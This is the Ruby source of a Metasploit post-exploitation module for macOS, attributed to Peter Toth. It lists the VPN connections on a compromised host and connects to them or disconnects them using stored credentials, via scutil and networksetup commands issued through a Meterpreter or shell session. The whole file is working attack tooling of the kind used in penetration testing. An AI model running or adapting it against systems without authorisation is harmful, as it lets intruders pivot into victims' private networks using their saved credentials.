##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX ',
        'Description'   => %q{
          This module lists VPN connections and tries to connect to them using stored credentials.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ],
        'Actions'       => [ 
          [ 'LIST',     { 'Description' => 'Show a list of VPN connections' } ],
          [ 'CONNECT', { 'Description' => 'Connect to a VPN using stored credentials' } ],
          [ 'DISCONNECT', { 'Description' => 'Disconnect from a VPN' } ]
        ],
        'DefaultAction' => 'LIST'
      ))

    register_options(
      [
        OptString.new('VPN_CONNECTION', [true, 'Name of VPN connection. `set ACTION LIST` to get a list.', 'OSX_VPN'])
      ], self.class)

  end

  def run
    fail_with("Invalid action") if action.nil?

    if action.name =~ /list/i
      data = get_vpn_list()
      print_status("VPN Connections Status: UP")
      parse_vpn_connection_names(data, true)
      print_status("VPN Connections Status: DOWN")
      parse_vpn_connection_names(data, false)
    elsif action.name == "CONNECT"
      connect_vpn(true)
    elsif action.name == "DISCONNECT"
      connect_vpn(false)
    end
  end

  def get_vpn_list()
    if session.type =~ /meterpreter/
      vprint_status("scutil --nc list")
      data = cmd_exec("scutil --nc list")
    elsif session.type =~ /shell/
      vprint_status("/usr/sbin/scutil --nc list")
      data = session.shell_command_token("/usr/sbin/scutil --nc list",15)
    end
    return data
  end

  def parse_vpn_connection_names(data, show_up)
    lines = data.split(/\n/).map(&:strip)

    for x in 1..lines.length-1
      line = lines[x]
      if show_up && line.start_with?('* (Connected)')
        print_good('  ' + line.split('"')[1])
      elsif !show_up && line.start_with?('* (Disconnected)')
        print_good('  ' + line.split('"')[1])
      end
    end
  end

  def connect_vpn(up)
    vpn_name = datastore['VPN_CONNECTION']
    if up
      header = "Connecting to VPN: #{vpn_name}"
      connection_state = '* (Connected)'
      connection_unnecessary = "  #{vpn_name} already connected"
    else
      header = "Disconnecting from VPN: #{vpn_name}"
      connection_state = '* (Disconnected)'
      connection_unnecessary = "  #{vpn_name} already disconnected"
    end

    print_status(header)
    data = get_vpn_list()
    lines = data.split(/\n/).map(&:strip)

    identifier = nil
    for x in 1..lines.length-1
      line = lines[x]
      if line.split('"')[1] == vpn_name
        if line.start_with?(connection_state)
          print_status(connection_unnecessary)
          return
        end
        identifier = line.split(' ')[2]
        break
      end
    end

    if identifier.nil?
      print_error("  #{vpn_name} not found")
      return
    end

    if session.type =~ /meterpreter/
      if up
        cmd = 'networksetup -connectpppoeservice "' + vpn_name + '"'
      else
        cmd = "scutil --nc stop #{identifier}"
      end
      vprint_status(cmd)
      cmd_exec(cmd)
    elsif session.type =~ /shell/
      if up
        cmd = 'networksetup -connectpppoeservice "' + vpn_name + '"'
      else
        cmd = "scutil --nc stop #{identifier}"
      end
      vprint_status(cmd)
      session.shell_command_token(cmd,15)
    end
  end
end
